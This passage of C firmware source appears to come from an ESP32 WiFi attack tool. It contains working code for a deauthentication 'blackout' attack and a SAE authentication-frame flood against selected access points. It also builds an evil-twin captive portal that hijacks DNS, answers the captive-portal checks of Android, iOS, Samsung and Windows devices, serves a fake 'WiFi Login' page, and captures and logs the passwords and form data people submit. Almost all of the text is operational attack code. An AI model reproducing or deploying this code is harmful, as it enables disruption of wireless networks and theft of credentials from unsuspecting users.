    ESP_LOGI(TAG, "Starting blackout attack...");
    
    // Ensure WiFi is in APSTA mode so we can transmit raw frames on WIFI_IF_AP
    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);
    if (mode != WIFI_MODE_APSTA && mode != WIFI_MODE_AP) {
        ESP_LOGI(TAG, "Switching WiFi to APSTA mode for raw frame transmission");
        esp_wifi_set_mode(WIFI_MODE_APSTA);
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    // Hide the AP SSID to prevent broadcasting unwanted network during blackout
    wifi_config_t ap_config = {
        .ap = {
            .ssid = "",
            .ssid_len = 0,
            .ssid_hidden = 1,  // Hide SSID - prevents beacon broadcast
            .channel = 1,
            .password = "",
            .max_connection = 0,  // No connections allowed
            .authmode = WIFI_AUTH_OPEN
        }
    };
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    ESP_LOGI(TAG, "AP SSID hidden (blackout mode)");
    
    stats_deauth_sent = 0;
    blackout_attack_active = true;
    portENTER_CRITICAL(&blackout_stats_spin);
    blackout_stats.active = true;
    blackout_stats.networks_attacked = 0;
    blackout_stats.status = BLACKOUT_STATUS_RESCANNING;
    portEXIT_CRITICAL(&blackout_stats_spin);
    
    xTaskCreate(blackout_attack_task, "blackout_attack", 8192, NULL, 3, &blackout_attack_task_handle);
    
    return ESP_OK;
}

esp_err_t wifi_attacks_stop_blackout(void) {
    if (!blackout_attack_active) {
        return ESP_ERR_INVALID_STATE;
    }
    
    ESP_LOGI(TAG, "Stopping blackout attack...");
    blackout_attack_active = false;
    portENTER_CRITICAL(&blackout_stats_spin);
    blackout_stats.active = false;
    blackout_stats.status = BLACKOUT_STATUS_RESCANNING;
    portEXIT_CRITICAL(&blackout_stats_spin);
    
    int wait_count = 0;
    while (blackout_attack_task_handle != NULL && wait_count < 50) {
        vTaskDelay(pdMS_TO_TICKS(100));
        wait_count++;
    }
    
    return ESP_OK;
}

bool wifi_attacks_is_blackout_active(void) {
    return blackout_attack_active;
}

esp_err_t wifi_attacks_get_blackout_stats(blackout_stats_t *out) {
    if (!out) {
        return ESP_ERR_INVALID_ARG;
    }
    portENTER_CRITICAL(&blackout_stats_spin);
    *out = blackout_stats;
    portEXIT_CRITICAL(&blackout_stats_spin);
    return ESP_OK;
}

// ============================================================================
// SAE OVERFLOW ATTACK
// ============================================================================

// SAE commit frame template
static const uint8_t sae_commit_template[] = {
    0xB0, 0x00,                         // Frame Control (Authentication)
    0x00, 0x00,                         // Duration
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination (AP BSSID)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (random STA)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Sequence
    0x03, 0x00,                         // Auth algorithm: SAE
    0x01, 0x00,                         // Auth transaction: commit
    0x00, 0x00                          // Status code
};

static void sae_attack_task(void *pvParameters) {
    ESP_LOGI(TAG, "[SAE Overflow] Attack started");
    
    target_bssid_t targets[MAX_TARGET_BSSIDS];
    int target_count = wifi_scanner_get_targets(targets, MAX_TARGET_BSSIDS);
    
    if (target_count == 0) {
        ESP_LOGW(TAG, "[SAE Overflow] No targets selected - stopping");
        sae_attack_active = false;
        sae_attack_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }
    
    // Log target information
    ESP_LOGI(TAG, "[SAE Overflow] Targeting %d network(s)", target_count);
    for (int i = 0; i < target_count; i++) {
        ESP_LOGI(TAG, "[SAE Overflow] Target %d: %s (%02X:%02X:%02X:%02X:%02X:%02X) on CH%d",
                 i + 1,
                 targets[i].ssid,
                 targets[i].bssid[0], targets[i].bssid[1], targets[i].bssid[2],
                 targets[i].bssid[3], targets[i].bssid[4], targets[i].bssid[5],
                 targets[i].channel);
    }
    
    uint8_t sae_frame[sizeof(sae_commit_template) + 256];
    uint32_t frame_count = 0;
    
    while (sae_attack_active && !g_operation_stop_requested) {
        for (int i = 0; i < target_count; i++) {
            if (!sae_attack_active || g_operation_stop_requested) break;
            
            // Set channel
            esp_wifi_set_channel(targets[i].channel, WIFI_SECOND_CHAN_NONE);
            vTaskDelay(50);
            
            // Prepare SAE commit frame with random STA MAC
            memcpy(sae_frame, sae_commit_template, sizeof(sae_commit_template));
            memcpy(&sae_frame[4], targets[i].bssid, 6);   // Destination (AP)
            
            // Random source MAC
            for (int j = 0; j < 6; j++) {
                sae_frame[10 + j] = esp_random() & 0xFF;
            }
            sae_frame[10] &= 0xFE; // Clear multicast bit
            
            memcpy(&sae_frame[16], targets[i].bssid, 6);  // BSSID
            
            // Add random SAE data
            int offset = sizeof(sae_commit_template);
            for (int j = 0; j < 200; j++) {
                sae_frame[offset++] = esp_random() & 0xFF;
            }
            
            // Log SAE frame info: SSID, BSSID, Channel
            ESP_LOGI(TAG, "[SAE] SSID: %-32s | BSSID: %02X:%02X:%02X:%02X:%02X:%02X | CH: %2d | #%lu",
                     targets[i].ssid[0] ? targets[i].ssid : "(hidden)",
                     targets[i].bssid[0], targets[i].bssid[1], targets[i].bssid[2],
                     targets[i].bssid[3], targets[i].bssid[4], targets[i].bssid[5],
                     targets[i].channel, (unsigned long)frame_count + 1);
            
            // Send frame
            esp_wifi_80211_tx(WIFI_IF_AP, sae_frame, offset, false);
            frame_count++;
            
            vTaskDelay(pdMS_TO_TICKS(5));
        }
        
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    
    ESP_LOGI(TAG, "[SAE Overflow] Attack stopped | Total frames sent: %lu", (unsigned long)frame_count);
    sae_attack_active = false;
    sae_attack_task_handle = NULL;
    vTaskDelete(NULL);
}

esp_err_t wifi_attacks_start_sae_overflow(void) {
    if (sae_attack_active) {
        ESP_LOGW(TAG, "SAE attack already running");
        return ESP_ERR_INVALID_STATE;
    }
    
    int target_count = wifi_scanner_get_target_count();
    if (target_count == 0) {
        ESP_LOGE(TAG, "No targets selected");
        return ESP_ERR_INVALID_ARG;
    }
    
    ESP_LOGI(TAG, "Starting SAE overflow attack...");
    
    // Ensure WiFi is in APSTA mode so we can transmit raw frames on WIFI_IF_AP
    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);
    if (mode != WIFI_MODE_APSTA && mode != WIFI_MODE_AP) {
        ESP_LOGI(TAG, "Switching WiFi to APSTA mode for raw frame transmission");
        esp_wifi_set_mode(WIFI_MODE_APSTA);
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    // Hide the AP SSID to prevent broadcasting unwanted network during SAE attack
    wifi_config_t ap_config = {
        .ap = {
            .ssid = "",
            .ssid_len = 0,
            .ssid_hidden = 1,  // Hide SSID - prevents beacon broadcast
            .channel = 1,
            .password = "",
            .max_connection = 0,  // No connections allowed
            .authmode = WIFI_AUTH_OPEN
        }
    };
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    ESP_LOGI(TAG, "AP SSID hidden (SAE attack mode)");
    
    sae_attack_active = true;
    xTaskCreate(sae_attack_task, "sae_attack", 8192, NULL, 3, &sae_attack_task_handle);
    
    return ESP_OK;
}

esp_err_t wifi_attacks_stop_sae_overflow(void) {
    if (!sae_attack_active) {
        return ESP_ERR_INVALID_STATE;
    }
    
    ESP_LOGI(TAG, "Stopping SAE overflow...");
    sae_attack_active = false;
    
    int wait_count = 0;
    while (sae_attack_task_handle != NULL && wait_count < 50) {
        vTaskDelay(pdMS_TO_TICKS(100));
        wait_count++;
    }
    
    return ESP_OK;
}

bool wifi_attacks_is_sae_overflow_active(void) {
    return sae_attack_active;
}

// ============================================================================
// KARMA ATTACK
// ============================================================================

esp_err_t wifi_attacks_start_karma(void) {
    ESP_LOGI(TAG, "Karma attack not yet implemented");
    // TODO: Implement Karma attack
    // - Monitor probe requests
    // - Create fake APs matching requested SSIDs
    return ESP_ERR_NOT_SUPPORTED;
}

esp_err_t wifi_attacks_stop_karma(void) {
    return ESP_OK;
}

bool wifi_attacks_is_karma_active(void) {
    return false;
}

// ============================================================================
// CAPTIVE PORTAL
// ============================================================================

// Default portal HTML
static const char default_portal_html[] = 
"<!DOCTYPE html><html><head><meta charset='utf-8'><title>WiFi Login</title>"
"<meta name='viewport' content='width=device-width,initial-scale=1'>"
"<style>body{font-family:Arial;margin:40px;text-align:center;background:#f0f0f0}"
".container{max-width:400px;margin:auto;background:white;padding:30px;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}"
"h1{color:#333}input{width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:5px;box-sizing:border-box}"
"button{background:#007bff;color:white;padding:12px;border:none;border-radius:5px;cursor:pointer;width:100%;font-size:16px}"
"button:hover{background:#0056b3}</style>"
"<script>"
"if (window.location.hostname !== '172.0.0.1') {"
"    window.location.href = 'http://172.0.0.1/';"
"}"
"</script>"
"</head><body>"
"<div class='container'><h1>WiFi Login</h1><p>Please enter your WiFi password to continue</p>"
"<form method='POST' action='/login'><input type='password' name='password' placeholder='Password' required>"
"<button type='submit'>Connect</button></form></div></body></html>";

static esp_err_t portal_root_handler(httpd_req_t *req) {
    // Root handler (silent)
    
    // Add captive portal headers
    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
    httpd_resp_set_hdr(req, "Pragma", "no-cache");
    httpd_resp_set_hdr(req, "Expires", "0");
    httpd_resp_set_type(req, "text/html");
    
    // Serve custom HTML if loaded, otherwise default
    if (custom_portal_html != NULL && strlen(custom_portal_html) > 0) {
        httpd_resp_send(req, custom_portal_html, strlen(custom_portal_html));
    } else {
        httpd_resp_send(req, default_portal_html, strlen(default_portal_html));
    }
    return ESP_OK;
}

// Android captive portal detection
static esp_err_t portal_generate_204_handler(httpd_req_t *req) {
    // Android captive portal detection (silent)
    // If we return 204, Android thinks internet works
    // If we return 200 with HTML, Android thinks it's a captive portal
    // So we return 200 with our portal HTML to trigger captive portal
    httpd_resp_set_status(req, "200 OK");
    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
    httpd_resp_set_hdr(req, "Pragma", "no-cache");
    httpd_resp_set_hdr(req, "Expires", "0");
    httpd_resp_set_type(req, "text/html");
    
    // Send our portal HTML to trigger captive portal
    const char* portal_html = (custom_portal_html != NULL && strlen(custom_portal_html) > 0) ? custom_portal_html : default_portal_html;
    httpd_resp_send(req, portal_html, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// iOS captive portal detection
static esp_err_t portal_hotspot_detect_handler(httpd_req_t *req) {
    // iOS captive portal detection (silent)
    // So we return our portal HTML with password form to trigger captive portal popup
    httpd_resp_set_status(req, "200 OK");
    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
    httpd_resp_set_hdr(req, "Pragma", "no-cache");
    httpd_resp_set_hdr(req, "Expires", "0");
    httpd_resp_set_type(req, "text/html");
    
    // Send our portal HTML to show password form
    const char* portal_html = (custom_portal_html != NULL && strlen(custom_portal_html) > 0) ? custom_portal_html : default_portal_html;
    httpd_resp_send(req, portal_html, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// RFC 8908 example endpoint - updated with 172.0.0.1 URLs
static esp_err_t captive_api_handler(httpd_req_t *req) {
    // RFC8908 API (silent)
    
    // Set CORS headers
    httpd_resp_set_hdr(req, "Access-Control-Allow-Origin", "*");
    httpd_resp_set_hdr(req, "Access-Control-Allow-Methods", "GET, POST, OPTIONS");
    httpd_resp_set_hdr(req, "Access-Control-Allow-Headers", "Content-Type");
    
    // Handle preflight OPTIONS request
    if (req->method == HTTP_OPTIONS) {
        httpd_resp_set_status(req, "200 OK");
        httpd_resp_set_type(req, "application/json");
        httpd_resp_send(req, NULL, 0);
        return ESP_OK;
    }
    
    // RFC 8908 compliant JSON response
    const char* json_response = 
        "{"
        "\"captive\": true,"
        "\"user-portal-url\": \"http://172.0.0.1/portal\","
        "\"venue-info-url\": \"http://172.0.0.1/portal\","
        "\"is-portal\": true,"
        "\"can-extend-session\": false,"
        "\"seconds-remaining\": 0,"
        "\"bytes-remaining\": 0"
        "}";
    
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, json_response, strlen(json_response));
    return ESP_OK;
}

// Portal page handler
static esp_err_t portal_handler(httpd_req_t *req) {
    emit_evil_twin_event(EVIL_TWIN_EVENT_PORTAL_OPENED, evilTwinSSID, NULL);
    httpd_resp_set_type(req, "text/html");
    const char* portal_html = (custom_portal_html != NULL && strlen(custom_portal_html) > 0) ? custom_portal_html : default_portal_html;
    httpd_resp_send(req, portal_html, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// Handler for catch-all captive portal redirect
static esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
    // Redirect all unrecognized requests to our portal page
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "/portal");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

// GET handler with query string support
static esp_err_t get_handler(httpd_req_t *req) {
    // GET handler (silent)
    
    // Get query string
    size_t query_len = httpd_req_get_url_query_len(req);
    if (query_len > 0) {
        char *query_string = malloc(query_len + 1);
        if (query_string) {
            if (httpd_req_get_url_query_str(req, query_string, query_len + 1) == ESP_OK) {
                ESP_LOGI(TAG, "Received GET query: %s", query_string);
                
                // Parse password from query string
                char password_param[64];
                if (httpd_query_key_value(query_string, "password", password_param, sizeof(password_param)) == ESP_OK) {
                    // URL decode the password
                    char decoded_password[64];
                    url_decode(password_param, decoded_password, sizeof(decoded_password));
                    
                    ESP_LOGI(TAG, "[Portal] Password from GET: %s", decoded_password);
                    
                    // Check mode: Karma or Evil Twin
                    if (karma_mode) {
                        // Karma mode - save data without WiFi verification
                        ESP_LOGI(TAG, "Karma mode: Saving GET data without WiFi verification");
                        save_karma_data(evilTwinSSID, query_string);
                    } else if (strlen(evilTwinSSID) > 0) {
                        // Evil Twin mode - verify password
                        verify_password(decoded_password);
                    }
                }
            }
            free(query_string);
        }
    }
    
    // Send response based on mode and password verification result
    const char* response;
    if (karma_mode) {
        // Karma mode - always show success
        response = 
            "<!DOCTYPE html><html><head>"
            "<meta charset='UTF-8'>"
            "<title>Success</title>"
            "<style>"
            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; text-align: center; }"
            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; }"
            "h1 { color: #28a745; }"
            "</style>"
            "</head>"
            "<body>"
            "<div class='container'>"
            "<h1>Thank You!</h1>"
            "<p>Your information has been submitted successfully.</p>"
            "</div>"
            "</body></html>";
    } else if (last_password_wrong) {
        response = 
            "<!DOCTYPE html><html><head>"
            "<meta charset='UTF-8'>"
            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
            "<title>Wrong Password</title>"
            "<style>"
            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
            "h1 { text-align: center; color: #d32f2f; margin-bottom: 20px; }"
            "p { text-align: center; color: #666; }"
            "a { display: block; text-align: center; margin-top: 20px; padding: 12px; background: #007bff; color: white; text-decoration: none; border-radius: 5px; }"
            "a:hover { background: #0056b3; }"
            "</style>"
            "</head>"
            "<body>"
            "<div class='container'>"
            "<h1>Wrong Password</h1>"
            "<p>The password you entered is incorrect. Please try again.</p>"
            "<a href='/portal'>Try Again</a>"
            "</div>"
            "</body></html>";
    } else {
        response = 
            "<!DOCTYPE html><html><head>"
            "<meta charset='UTF-8'>"
            "<title>Verifying...</title>"
            "<style>"
            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; text-align: center; }"
            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; }"
            "</style>"
            "</head>"
            "<body>"
            "<div class='container'>"
            "<h1>Verifying...</h1>"
            "<p>Please wait while we verify your credentials.</p>"
            "</div>"
            "</body></html>";
    }
    
    httpd_resp_send(req, response, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// Save handler for POST /save
static esp_err_t save_handler(httpd_req_t *req) {
    // Save handler (silent)
    
    char buf[256];
    int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (ret <= 0) {
        ESP_LOGI(TAG, "Failed to receive POST data");
        return ESP_FAIL;
    }
    buf[ret] = '\0';
    
    ESP_LOGI(TAG, "Received POST data: %s", buf);
    
    // Parse password from POST data
    char *password_start = strstr(buf, "password=");
    if (password_start) {
        password_start += 9; // Skip "password="
        char *password_end = strchr(password_start, '&');
        if (password_end) {
            *password_end = '\0';
        }
        
        // URL decode the password
        char decoded_password[64];
        url_decode(password_start, decoded_password, sizeof(decoded_password));
        
        ESP_LOGI(TAG, "[Portal] Password from /save: %s", decoded_password);
        
        // Check mode: Karma or Evil Twin
        if (karma_mode) {
            // Karma mode - save data without WiFi verification
            ESP_LOGI(TAG, "Karma mode: Saving /save data without WiFi verification");
            save_karma_data(evilTwinSSID, buf);
        } else if (strlen(evilTwinSSID) > 0) {
            // Evil Twin mode - verify password
            verify_password(decoded_password);
        }
    }
    
    // Send response based on mode
    const char* response;
    if (karma_mode) {
        // Karma mode - always show success
        response = 
            "<!DOCTYPE html><html><head>"
            "<title>Success</title>"
            "<style>body { font-family: Arial; text-align: center; padding: 50px; } h1 { color: #28a745; }</style>"
            "</head>"
            "<body>"
            "<h1>Thank You!</h1>"
            "<p>Your information has been submitted successfully.</p>"
            "</body></html>";
    } else if (last_password_wrong) {
        response = 
            "<!DOCTYPE html><html><head>"
            "<title>Wrong Password</title>"
            "<style>body { font-family: Arial; text-align: center; padding: 50px; }</style>"
            "</head>"
            "<body>"
            "<h1>Wrong Password</h1>"
            "<p>The password is incorrect. Please try again.</p>"
            "<a href='/portal'>Try Again</a>"
            "</body></html>";
    } else {
        response = 
            "<!DOCTYPE html><html><head>"
            "<title>Verifying...</title>"
            "<style>body { font-family: Arial; text-align: center; padding: 50px; }</style>"
            "</head>"
            "<body>"
            "<h1>Verifying...</h1>"
            "<p>Please wait...</p>"
            "</body></html>";
    }
    
    httpd_resp_send(req, response, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// Portal submit handler for POST /login and POST /submit
static esp_err_t portal_submit_handler(httpd_req_t *req) {
    char buf[256];
    int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (ret <= 0) {
        return ESP_FAIL;
    }
    buf[ret] = '\0';
    
    // Always emit FORM_DATA with all key=value pairs for UI display
    {
        char form_display[256];
        form_display[0] = '\0';
        char *buf_copy = strdup(buf);
        if (buf_copy) {
            char *saveptr = NULL;
            char *field = strtok_r(buf_copy, "&", &saveptr);
            size_t pos = 0;
            while (field != NULL && pos < sizeof(form_display) - 1) {
                char *eq = strchr(field, '=');
                if (eq) {
                    *eq = '\0';
                    char *value = eq + 1;
                    char decoded_val[64];
                    url_decode(value, decoded_val, sizeof(decoded_val));
                    int written = snprintf(form_display + pos, sizeof(form_display) - pos,
                                           "%s%s=%s", pos > 0 ? "\n" : "", field, decoded_val);
                    if (written > 0) pos += written;
                }
                field = strtok_r(NULL, "&", &saveptr);
            }
            free(buf_copy);
        }
        emit_evil_twin_event(EVIL_TWIN_EVENT_FORM_DATA, evilTwinSSID, form_display);
    }
    
    // Parse password from POST data for Evil Twin / Karma verification
    char *password_start = strstr(buf, "password=");
    if (password_start) {
        password_start += 9;
        char *password_end = strchr(password_start, '&');
        if (password_end) {
            *password_end = '\0';
        }
        
        char decoded_password[64];
        url_decode(password_start, decoded_password, sizeof(decoded_password));
        
        ESP_LOGI(TAG, "Client submitted password");
        
        emit_evil_twin_event(EVIL_TWIN_EVENT_PASSWORD_PROVIDED, evilTwinSSID, NULL);
        
        if (karma_mode) {
            ESP_LOGI(TAG, "Karma mode: Saving data without WiFi verification");
            save_karma_data(evilTwinSSID, buf);
        } else if (strlen(evilTwinSSID) > 0) {
            ESP_LOGI(TAG, "Evil Twin mode: Verifying password...");
            verify_password(decoded_password);
        } else {
            save_portal_data("portal", buf);
        }
    }
    
    // Send response based on mode and password attempt result
    const char* response;
    if (karma_mode) {
        // Karma mode - always show success message
        response = 
            "<!DOCTYPE html><html><head>"
            "<meta charset='UTF-8'>"
            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
            "<title>Success</title>"
            "<style>"
            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
            "h1 { text-align: center; color: #28a745; margin-bottom: 20px; }"
            "p { text-align: center; color: #666; }"
            "</style>"
            "</head>"
            "<body>"
            "<div class='container'>"
            "<h1>Thank You!</h1>"
            "<p>Your information has been submitted successfully.</p>"
            "</div>"
            "</body></html>";
    } else if (last_password_wrong) {
        // Show "Wrong Password" message
        response = 
            "<!DOCTYPE html><html><head>"
            "<meta charset='UTF-8'>"
            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
            "<title>Wrong Password</title>"
            "<style>"
            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
            "h1 { text-align: center; color: #d32f2f; margin-bottom: 20px; }"
            "p { text-align: center; color: #666; }"
            "a { display: block; text-align: center; margin-top: 20px; padding: 12px; background: #007bff; color: white; text-decoration: none; border-radius: 5px; }"
            "a:hover { background: #0056b3; }"
            "</style>"
            "</head>"
            "<body>"
            "<div class='container'>"
            "<h1>Wrong Password</h1>"
            "<p>The password you entered is incorrect. Please try again.</p>"
            "<a href='/portal'>Try Again</a>"
            "</div>"
            "</body></html>";
    } else {
        // Show "Processing" message (Evil Twin mode)
        response = 
            "<!DOCTYPE html><html><head>"
            "<meta charset='UTF-8'>"
            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
            "<title>Processing</title>"
            "<style>"
            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
            "h1 { text-align: center; color: #007bff; margin-bottom: 20px; }"
            "p { text-align: center; color: #666; }"
            ".spinner { margin: 20px auto; width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #007bff; border-radius: 50%; animation: spin 1s linear infinite; }"
            "@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }"
            "</style>"
            "</head>"
            "<body>"
            "<div class='container'>"
            "<h1>Verifying...</h1>"
            "<div class='spinner'></div>"
            "<p>Please wait while we verify your credentials.</p>"
            "</div>"
            "</body></html>";
    }
    
    httpd_resp_send(req, response, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// Captive detection handler for Samsung/Windows
static esp_err_t captive_detection_handler(httpd_req_t *req) {
    // Captive detection (silent)
    
    // Add captive portal headers
    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
    httpd_resp_set_hdr(req, "Pragma", "no-cache");
    httpd_resp_set_hdr(req, "Expires", "0");
    httpd_resp_set_hdr(req, "Connection", "close");
    
    // Return portal HTML
    httpd_resp_set_type(req, "text/html");
    const char* portal_html = (custom_portal_html != NULL && strlen(custom_portal_html) > 0) ? custom_portal_html : default_portal_html;
    httpd_resp_send(req, portal_html, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

static esp_err_t start_portal_services(void)
{
    if (portal_active) {
        ESP_LOGW(TAG, "Portal already active");
        return ESP_OK;
    }
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.server_port = 80;
    config.max_open_sockets = 7;
    config.max_uri_handlers = 16;  // Increase from default 8 to support all captive portal endpoints
    config.lru_purge_enable = true;
    
    if (httpd_start(&portal_server, &config) == ESP_OK) {
        // Root handler
        httpd_uri_t root = { .uri = "/", .method = HTTP_GET, .handler = portal_root_handler, .user_ctx = NULL };
        httpd_register_uri_handler(portal_server, &root);
        
        // Portal page handler
        httpd_uri_t portal_uri = { .uri = "/portal", .method = HTTP_GET, .handler = portal_handler, .user_ctx = NULL };
        httpd_register_uri_handler(portal_server, &portal_uri);
        
        // Login handler (POST /login)
        httpd_uri_t login = { .uri = "/login", .method = HTTP_POST, .handler = portal_submit_handler, .user_ctx = NULL };
        httpd_register_uri_handler(portal_server, &login);
        
        // Submit handler (legacy POST /submit)
        httpd_uri_t submit = { .uri = "/submit", .method = HTTP_POST, .handler = portal_submit_handler, .user_ctx = NULL };
        httpd_register_uri_handler(portal_server, &submit);
        
        // GET handler for query strings
        httpd_uri_t get_uri = { .uri = "/get", .method = HTTP_GET, .handler = get_handler, .user_ctx = NULL };
        httpd_register_uri_handler(portal_server, &get_uri);
        
        // Save handler (POST /save)
        httpd_uri_t save_uri = { .uri = "/save", .method = HTTP_POST, .handler = save_handler, .user_ctx = NULL };
        httpd_register_uri_handler(portal_server, &save_uri);
        
        // Android captive portal detection
        httpd_uri_t gen204 = { .uri = "/generate_204", .method = HTTP_GET, .handler = portal_generate_204_handler, .user_ctx = NULL };
        httpd_register_uri_handler(portal_server, &gen204);
        
        // iOS captive portal detection
        httpd_uri_t hotspot = { .uri = "/hotspot-detect.html", .method = HTTP_GET, .handler = portal_hotspot_detect_handler, .user_ctx = NULL };
        httpd_register_uri_handler(portal_server, &hotspot);
        
        // Samsung captive portal detection
        httpd_uri_t samsung = { .uri = "/ncsi.txt", .method = HTTP_GET, .handler = captive_detection_handler, .user_ctx = NULL };
        httpd_register_uri_handler(portal_server, &samsung);
        
        // Windows captive portal detection
        httpd_uri_t windows = { .uri = "/connecttest.txt", .method = HTTP_GET, .handler = captive_detection_handler, .user_ctx = NULL };
        httpd_register_uri_handler(portal_server, &windows);
        
        // RFC 8908 Captive Portal API
        httpd_uri_t api = { .uri = "/captive-portal/api", .method = HTTP_GET, .handler = captive_api_handler, .user_ctx = NULL };
        httpd_register_uri_handler(portal_server, &api);
        
        // Catch-all handler for all other requests (MUST be last)
        httpd_uri_t catchall = { .uri = "/*", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL };
        httpd_register_uri_handler(portal_server, &catchall);
        
        ESP_LOGI(TAG, "HTTP server started with all captive portal endpoints");
    } else {
        ESP_LOGE(TAG, "Failed to start HTTP server");
        return ESP_FAIL;
    }
    // Set portal_active BEFORE creating DNS task to avoid race condition
    portal_active = true;
    connectAttemptCount = 0;
    xTaskCreate(dns_server_task, "dns_server", 4096, NULL, 5, &dns_server_task_handle);
    ESP_LOGI(TAG, "Captive portal started");
    return ESP_OK;
}

static void stop_portal_services(void)
{
    if (!portal_active) return;
    if (dns_server_socket >= 0) {
        close(dns_server_socket);
        dns_server_socket = -1;
    }
    int wait_count = 0;
    while (dns_server_task_handle != NULL && wait_count < 50) {
        vTaskDelay(pdMS_TO_TICKS(100));
        wait_count++;
    }
    if (portal_server) {
        httpd_stop(portal_server);
        portal_server = NULL;
    }
    portal_active = false;
}

static void dns_server_task(void *pvParameters) {
    (void)pvParameters;
    
    struct sockaddr_in server_addr;
    struct sockaddr_in client_addr;
    socklen_t client_addr_len = sizeof(client_addr);
    char rx_buffer[DNS_MAX_PACKET_SIZE];
    char tx_buffer[DNS_MAX_PACKET_SIZE];
    
    // Create UDP socket
    dns_server_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (dns_server_socket < 0) {
        ESP_LOGE(TAG, "Failed to create DNS socket: %d", errno);
        dns_server_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }
    
    // Bind to DNS port 53
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    server_addr.sin_port = htons(DNS_PORT);
    
    int err = bind(dns_server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr));
    if (err < 0) {
        ESP_LOGE(TAG, "Failed to bind DNS socket: %d", errno);
        close(dns_server_socket);
        dns_server_socket = -1;
        dns_server_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }
    
    // Set socket timeout so we can check portal_active flag periodically
    struct timeval timeout;
    timeout.tv_sec = 1;
    timeout.tv_usec = 0;
    setsockopt(dns_server_socket, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    
    // Main DNS server loop
    while (portal_active) {
        int len = recvfrom(dns_server_socket, rx_buffer, sizeof(rx_buffer), 0,
                          (struct sockaddr *)&client_addr, &client_addr_len);
        
        if (len < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                // Timeout, check portal_active flag and continue
                continue;
            }
            ESP_LOGE(TAG, "DNS recvfrom error: %d", errno);
            break;
        }
        
        if (len < 12) {
            // DNS header is at least 12 bytes
            continue;
        }
                
        // Build DNS response
        // Copy transaction ID and flags from request
        memcpy(tx_buffer, rx_buffer, 2); // Transaction ID
        
        // Set flags: Response, Authoritative, No Error
        tx_buffer[2] = 0x81; // QR=1 (response), Opcode=0, AA=0, TC=0, RD=0
        tx_buffer[3] = 0x80; // RA=1, Z=0, RCODE=0 (no error)
        
        // Copy question count (should be 1)
        tx_buffer[4] = rx_buffer[4];
        tx_buffer[5] = rx_buffer[5];
        
        // Answer count = 1
        tx_buffer[6] = 0x00;
        tx_buffer[7] = 0x01;
        
        // Authority RRs = 0
        tx_buffer[8] = 0x00;
        tx_buffer[9] = 0x00;
        
        // Additional RRs = 0
        tx_buffer[10] = 0x00;
        tx_buffer[11] = 0x00;
        
        // Copy the question section from the request
        int question_len = 0;
        int pos = 12;
        while (pos < len && rx_buffer[pos] != 0) {
